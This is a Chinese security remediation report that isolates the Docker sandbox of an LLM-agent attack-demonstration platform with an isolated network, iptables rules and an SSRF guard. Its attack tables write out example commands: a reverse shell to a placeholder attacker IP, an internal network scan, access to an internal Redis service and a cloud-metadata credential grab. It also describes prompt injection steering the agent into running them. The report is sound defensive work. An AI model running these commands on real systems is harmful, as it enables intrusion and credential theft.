# 沙箱环境安全整改报告

## 1. 漏洞概述

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 沙箱容器网络未隔离导致的内网渗透风险 |
| 漏洞类型 | 网络隔离缺失 |
| 影响范围 | 沙箱容器可作为跳板访问宿主机所在内网的任意服务 |
| 风险等级 | 高 |
| 整改状态 | 已完成 |

## 2. 漏洞成因

本系统的 Docker 沙箱存在两个条件的叠加，构成安全风险：

**条件 1：任意命令执行能力（设计功能）**

沙箱后端 API (`POST /sandbox/tool`) 接受任意 shell 命令并在 Docker 容器内执行，无命令过滤或白名单限制。这是系统的设计功能——平台的目的就是展示 LLM Agent 拥有命令执行工具时的安全风险。

代码位置 `backend/app/services/tools.py:344-363`，命令仅做双引号转义后直接传入 `/bin/sh -c` 执行：

```python
async def _run_command(self, session_id: str, params: dict) -> str:
    command = params.get("command")
    escaped_command = command.replace('"', '\\"')
    exit_code, stdout, stderr = await asyncio.to_thread(
        container_manager.exec_in_container,
        session_id,
        f'/bin/sh -c "{escaped_command}"'
    )
```

**条件 2：容器网络不隔离（安全缺陷）**

整改前，容器使用 Docker 默认 `bridge` 网络模式（`container.py` 中 `network_mode="bridge"`），对宿主机所在的内网完全可达。容器镜像还预装了 `curl`、`wget`、`netcat`、`gcc` 等网络和编译工具。

**两个条件叠加的后果：**

任意命令执行能力 + 无网络隔离 = 沙箱容器可以作为跳板攻击内网。

| 攻击行为 | 示例命令 | 影响 |
|---------|---------|------|
| 内网扫描 | `nmap -sP 192.168.1.0/24` | 发现内网存活主机和服务 |
| 内网服务攻击 | `curl http://192.168.1.100:6379/` | 直接访问未鉴权的 Redis、数据库等 |
| 反弹 Shell | `bash -i >& /dev/tcp/攻击者IP/4444 0>&1` | 攻击者获得容器的交互式控制 |
| 云元数据窃取 | `curl http://169.254.169.254/latest/meta-data/` | 获取云实例凭据、密钥 |
| 横向移动 | 以沙箱为跳板 | 攻击内网其他机器 |

**风险本质**：问题不在于容器内能执行任意命令（这是设计功能），而在于命令执行的影响范围超出了沙箱边界——沙箱没有起到"沙箱"应有的隔离作用。

## 3. 攻击路径

```
攻击者 → prompt injection → LLM Agent 被诱导调用工具
                                    │
                                    ▼
                        POST /sandbox/tool
                        { "tool": "run_command",
                          "params": { "command": "恶意命令" } }
                                    │
                                    ▼
                        Docker 容器内执行
                        (root 权限，无命令过滤)
                                    │
                                    ▼
                ┌───────────────────┼───────────────────┐
                ▼                   ▼                   ▼
          扫描内网主机         访问内网服务         反弹 Shell 到攻击者
         (nmap/ping)        (curl/wget)         (bash/nc/python)
```

## 4. 整改方案

### 4.1 方案选型

**核心原则：在网络层画隔离边界，不限制容器内部能力。**

本系统是安全攻击**演示平台**，需要展示 Agent 拥有高权限时的风险。限制容器内部能力（如命令白名单、去除 root 权限、删除网络工具）会使演示场景失效。因此选择网络层隔离方案——容器内部保持完整能力，但其网络流量被限制在允许的范围内。

### 4.2 方案设计

创建一个隔离的 Docker 网络（子网 `10.200.0.0/16`），通过宿主机 iptables 规则禁止沙箱容器访问内网私有 IP 段，保留公网访问能力。

```
                      ┌─ 公网 (允许) ──→ LLM API / 任意公网地址
                      │
沙箱容器 ──→ Docker 网关 ──┤
(10.200.0.x)  (10.200.0.1) │
                      ├─ 10.0.0.0/8     (拦截) ──╳  (豁免 10.200.0.0/16 自身)
                      ├─ 172.16.0.0/12  (拦截) ──╳
                      ├─ 192.168.0.0/16 (拦截) ──╳
                      └─ 169.254.0.0/16 (拦截) ──╳
```

### 4.3 保留容器内部完整能力的原因

| 能力 | 保留原因 |
|------|---------|
| root 权限 | 需演示 /etc/shadow 读取、恶意软件安装、系统配置修改等场景 |
| 全部 Linux Capabilities | 需演示 raw socket 网络嗅探、ptrace 进程注入等场景 |
| 任意命令执行 | 平台核心功能——展示工具调用被滥用的后果 |
| 网络工具 (curl, netcat) | 需演示数据外泄、反弹 shell、SSRF 等网络攻击 |
| 公网访问 | 真实测试模式需要调用外部 LLM API |

## 5. 整改实施

### 5.1 变更文件清单

| 文件 | 变更类型 | 说明 |
|------|---------|------|
| `backend/app/services/container.py` | 修改 | 创建隔离网络，容器接入该网络 |
| `backend/setup-sandbox-network.sh` | 新增 | 宿主机 iptables 规则脚本 |
| `docker-compose.yml` | 修改 | 声明隔离网络定义 |
| `backend/app/services/tools.py` | 修改 | `_http_request` 从宿主进程移入容器执行，增加 SSRF 预检 |
| `backend/app/services/ssrf_guard.py` | 新增 | 共享 SSRF 检测模块（从 `mcp_http.py` 提取） |
| `backend/app/services/mcp_http.py` | 修改 | SSRF 检查逻辑委托到 `ssrf_guard.py` |

### 5.2 改动 1：容器接入隔离网络

**文件**：`backend/app/services/container.py`

`ContainerManager` 类新增隔离网络的初始化逻辑。后端启动时自动检查并创建名为 `poc-sandbox-isolated` 的 Docker 网络（子网 `10.200.0.0/16`），所有新创建的沙箱容器自动接入该网络。

**关键变更**：

```python
class ContainerManager:
    ISOLATED_NETWORK_NAME = "poc-sandbox-isolated"
    ISOLATED_NETWORK_SUBNET = "10.200.0.0/16"

    def __init__(self):
        # ... 原有初始化 ...
        self._network = self._ensure_isolated_network()

    def _ensure_isolated_network(self):
        """启动时检查/创建隔离网络（get-or-create 幂等模式）"""
        try:
            return self.client.networks.get(self.ISOLATED_NETWORK_NAME)
        except docker.errors.NotFound:
            pass
        ipam_pool = docker.types.IPAMPool(subnet=self.ISOLATED_NETWORK_SUBNET)
        ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])
        return self.client.networks.create(
            self.ISOLATED_NETWORK_NAME, driver="bridge", ipam=ipam_config,
        )
```

容器创建时的网络参数从 `network_mode="bridge"` 改为 `network=self.ISOLATED_NETWORK_NAME`：

```python
# 整改前
container = self.client.containers.run(
    ...
    network_mode="bridge",   # Docker 默认网络，可达内网所有地址
)

# 整改后
container = self.client.containers.run(
    ...
    network=self.ISOLATED_NETWORK_NAME,  # 隔离网络 10.200.0.0/16
)
```

**后端与容器的通信不受影响**：后端通过 Docker SDK 的 `exec_run` 接口操作容器（走 `/var/run/docker.sock` Unix socket），不走 TCP 网络，因此容器切换网络不影响任何功能。

### 5.3 改动 2：宿主机 iptables 规则

**文件**：`backend/setup-sandbox-network.sh`（新增）

在 Docker 官方预留的 `DOCKER-USER` 链中插入 5 条规则，阻止沙箱子网访问内网私有地址：

```
DOCKER-USER 链评估顺序（从上到下）:

规则 1: -s 10.200.0.0/16 -d 10.200.0.0/16 → RETURN   (豁免：沙箱内部互通)
规则 2: -s 10.200.0.0/16 -d 10.0.0.0/8     → DROP     (拦截 A 类私有地址)
规则 3: -s 10.200.0.0/16 -d 172.16.0.0/12  → DROP     (拦截 B 类私有地址)
规则 4: -s 10.200.0.0/16 -d 192.168.0.0/16 → DROP     (拦截 C 类私有地址)
规则 5: -s 10.200.0.0/16 -d 169.254.0.0/16 → DROP     (拦截链路本地/云元数据)
默认:   RETURN                                          (公网放行)
```

**规则评估逻辑说明**：

- 规则 1 必须在规则 2 之前：沙箱子网 `10.200.0.0/16` 是 `10.0.0.0/8` 的子集，如果顺序颠倒，沙箱容器之间的通信会被误拦截。
- `DOCKER-USER` 链只作用于 FORWARD 路径（容器转发流量），不影响宿主机自身的 INPUT/OUTPUT 链。
- 所有规则带有 `--comment "poc-sandbox-isolation"` 标签，便于识别和清理。

**脚本特性**：

| 特性 | 说明 |
|------|------|
| 幂等执行 | 每次先删除已有的标签规则，再重新插入 |
| 可逆操作 | `--remove` 参数只删除不添加 |
| 规则持久化 | 规则存储在内核内存中，宿主机重启后丢失，需配置自动恢复机制 |

**使用方式**：

```bash
# 应用规则（需要 root 权限）
sudo bash backend/setup-sandbox-network.sh

# 查看当前规则
sudo iptables -L DOCKER-USER -n -v --line-numbers

# 移除规则
sudo bash backend/setup-sandbox-network.sh --remove
```

**持久化方式**（任选其一）：

- `apt install iptables-persistent` 后执行 `netfilter-persistent save`
- 创建 systemd 服务在启动时运行脚本
- 将脚本调用加入 `/etc/rc.local`

### 5.4 改动 3：Docker Compose 网络声明

**文件**：`docker-compose.yml`

新增 `poc-sandbox-isolated` 网络定义，使 `docker-compose up` 时网络即创建完毕：

```yaml
networks:
  default:
    name: poc-demo-network
  poc-sandbox-isolated:
    name: poc-sandbox-isolated
    driver: bridge
    ipam:
      config:
        - subnet: 10.200.0.0/16
```

此声明与 `container.py` 中的 get-or-create 逻辑互为兜底——无论是 docker-compose 先创建网络还是后端先启动，均不冲突。

### 5.5 改动 4：HTTP 工具 SSRF 漏洞修复

**文件**：`backend/app/services/tools.py`、`backend/app/services/ssrf_guard.py`（新增）、`backend/app/services/mcp_http.py`

**整改前的问题**：`_http_request` 工具使用后端宿主进程的 httpx 库直接发出 HTTP 请求，不在 Docker 容器内执行。这意味着即使容器网络被隔离，通过该工具仍可访问内网任意地址——网络隔离被完全绕过。

```
整改前路径:
前端 → POST /sandbox/tool {tool: "http_request", url: "http://内网地址"}
     → 后端 tools.py → httpx.request() → 宿主机网络栈 → 内网（不经过 Docker 网络，无隔离）

整改后路径:
前端 → POST /sandbox/tool {tool: "http_request", url: "..."}
     → 后端 tools.py → SSRF 预检（ssrf_guard.py，宿主侧拦截私有 IP）
                      → container_manager.exec_in_container() → 容器内 helper 脚本发请求
                      → Docker 网络 → iptables（网络层拦截私有 IP）
```

**整改内容**：

1. **请求移入容器执行**：HTTP 请求改由容器内的 helper 脚本（Python `urllib` / Node `fetch`）执行，流量经过 Docker 网络栈，受 iptables 规则约束。

2. **新增 SSRF 预检（纵深防御）**：从 `mcp_http.py` 提取共享的 SSRF 检测逻辑到独立模块 `ssrf_guard.py`，在宿主侧预先解析 URL 目标 IP，拦截对 RFC 1918 私有地址、环回地址和链路本地地址的请求。

```python
# backend/app/services/ssrf_guard.py
PRIVATE_IP_RANGES = [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "127.0.0.0/8", "169.254.0.0/16", "::1/128", "fc00::/7", "fe80::/10",
]
```

两层防护互为冗余：应用层 SSRF 预检可被 DNS rebinding 绕过，但网络层 iptables 仍会拦截；反之，若 iptables 规则意外缺失，应用层预检仍提供基本保护。

## 6. 整改前后对比

### 6.1 网络拓扑变化

```
【整改前】

沙箱容器 ──→ docker0 (172.17.0.1) ──→ 宿主机内核 ──→ 内网任意地址 ✓
(172.17.0.x)                                      ──→ 公网任意地址 ✓

【整改后】

沙箱容器 ──→ br-isolated (10.200.0.1) ──→ 宿主机内核 ──→ 内网私有地址 ╳ (iptables DROP)
(10.200.0.x)                                          ──→ 169.254.0.0/16 ╳ (iptables DROP)
                                                      ──→ 公网地址 ✓ (RETURN → 正常转发)
```

### 6.2 攻击场景拦截效果

| 攻击行为 | 整改前 | 整改后 |
|---------|--------|--------|
| `nmap -sP 192.168.1.0/24` (内网扫描) | 可执行，发现内网主机 | iptables DROP，无响应 |
| `curl http://192.168.1.100:6379/` (访问内部 Redis) | 可连接 | iptables DROP，连接超时 |
| `curl http://169.254.169.254/` (云元数据窃取) | 可获取实例凭据 | iptables DROP，连接超时 |
| `bash -i >& /dev/tcp/公网IP/4444` (反弹 Shell 到公网) | 可执行 | 可执行（公网访问保留） |
| `curl https://api.openai.com/...` (调用 LLM API) | 可执行 | 可执行（公网访问保留） |
| 容器内 `cat /etc/shadow` (本地提权演示) | 可执行 | 可执行（容器内部能力不变） |

### 6.3 功能影响评估

| 功能 | 影响 | 原因 |
|------|------|------|
| 沙箱命令执行 | 无影响 | 后端通过 Docker SDK `exec_run` 操作，走 Unix socket |
| 沙箱文件读写 | 无影响 | 后端通过 Docker SDK `get_archive`/`put_archive` 操作 |
| 真实模式 LLM 调用 | 无影响 | LLM API 在公网，公网访问保留 |
| 演示模式 Mock 对话 | 无影响 | 不涉及网络请求 |
| WebSocket 日志推送 | 无影响 | 前端到后端的连接，不经过沙箱网络 |
| RAG 服务 | 无影响 | RAG 容器不在沙箱网络中 |
| MCP 工具 | 无影响 | MCP 服务不在沙箱网络中 |

## 7. 其他防御措施

除上述 4 项代码改动外，系统中还有以下防御措施（整改前已存在）：

### 7.1 前端命令输入限制

前端 UI 不渲染命令输入框，沙箱命令执行只能通过预定义的攻击演示场景触发，命令内容硬编码在代码中。用户通过 UI 仅能执行：创建/销毁终端、切换终端、浏览文件。

### 7.2 后端端口不对外暴露

`docker-compose.yml` 中后端服务使用 `expose`（容器间通信）而非 `ports`（对外映射）。外部用户只能通过 nginx 反向代理访问前端，无法直接调用 `/sandbox/tool` API。

### 7.3 容器资源限制

容器设置了内存上限（512MB）和 CPU 配额（50%），防止资源耗尽攻击。

## 8. 遗留风险与后续建议

### 8.1 当前遗留风险

| 风险 | 说明 | 严重程度 | 建议 |
|------|------|---------|------|
| iptables 规则未自动持久化 | 宿主机重启后规则丢失，需手动重新执行脚本或配置自动恢复 | 中 | 部署时配置 iptables-persistent 或 systemd 服务 |
| 公网出站未限制 | 容器可向任意公网地址发送数据（数据外泄、反弹 Shell 到公网） | 低（演示需要） | 如需限制，可在 iptables 中添加出站白名单 |
| DNS 查询未限制 | 容器可进行任意 DNS 查询，可能泄露信息或用于 DNS 隧道 | 低 | 如需限制，可配置容器使用受控 DNS 服务器 |

### 8.2 后续建议

1. **持久化 iptables 规则**：在生产部署的宿主机上安装 `iptables-persistent` 或创建 systemd 服务，确保重启后规则自动恢复。

2. **定期验证**：部署后定期从沙箱容器内执行测试命令（如 `curl http://192.168.1.1`），验证网络隔离规则仍然生效。

3. **监控告警**：如条件允许，对 DOCKER-USER 链的 DROP 计数进行监控，异常增长可能表示有攻击尝试。

## 9. 部署操作步骤

### 9.1 应用代码变更

```bash
# 重新构建并启动服务（代码变更自动生效）
docker compose up -d --build backend
```

后端启动时会自动创建 `poc-sandbox-isolated` 网络（如不存在）。此后创建的所有新沙箱容器自动接入该网络。

### 9.2 配置宿主机 iptables 规则

```bash
# 应用网络隔离规则（需要 root 权限）
sudo bash backend/setup-sandbox-network.sh
```

预期输出：
```
Removing existing poc-sandbox-isolation rules from DOCKER-USER...
Done.
Applying poc-sandbox-isolation rules to DOCKER-USER...
Rules applied. Current DOCKER-USER chain:
num   pkts bytes target     prot opt in     out     source       destination
1        0     0 RETURN     all  --  *      *       10.200.0.0/16  10.200.0.0/16  /* poc-sandbox-isolation */
2        0     0 DROP       all  --  *      *       10.200.0.0/16  10.0.0.0/8     /* poc-sandbox-isolation */
3        0     0 DROP       all  --  *      *       10.200.0.0/16  172.16.0.0/12  /* poc-sandbox-isolation */
4        0     0 DROP       all  --  *      *       10.200.0.0/16  192.168.0.0/16 /* poc-sandbox-isolation */
5        0     0 DROP       all  --  *      *       10.200.0.0/16  169.254.0.0/16 /* poc-sandbox-isolation */
6        0     0 RETURN     all  --  *      *       0.0.0.0/0      0.0.0.0/0
```

### 9.3 验证隔离效果

```bash
# 1. 创建一个沙箱容器
curl -X POST http://localhost:8000/sandbox/containers \
  -H "Content-Type: application/json" \
  -d '{"image": "terminal-python:3.11"}'

# 2. 从容器内尝试访问内网地址（应超时/失败）
curl -X POST http://localhost:8000/sandbox/tool \
  -H "Content-Type: application/json" \
  -d '{"session_id": "<SESSION_ID>", "tool": "run_command", "params": {"command": "curl -m 5 http://192.168.1.1"}}'
# 预期：连接超时，exit_code 非 0

# 3. 从容器内尝试访问公网地址（应成功）
curl -X POST http://localhost:8000/sandbox/tool \
  -H "Content-Type: application/json" \
  -d '{"session_id": "<SESSION_ID>", "tool": "run_command", "params": {"command": "curl -m 5 https://httpbin.org/ip"}}'
# 预期：返回公网 IP，exit_code 0
```

### 9.4 持久化规则（可选但建议）

```bash
# 方式 A: iptables-persistent
sudo apt install -y iptables-persistent
sudo netfilter-persistent save

# 方式 B: systemd 服务
sudo tee /etc/systemd/system/sandbox-firewall.service > /dev/null <<'EOF'
[Unit]
Description=Sandbox network isolation iptables rules
After=docker.service
Requires=docker.service

[Service]
Type=oneshot
ExecStart=/bin/bash /path/to/backend/setup-sandbox-network.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable sandbox-firewall.service
```
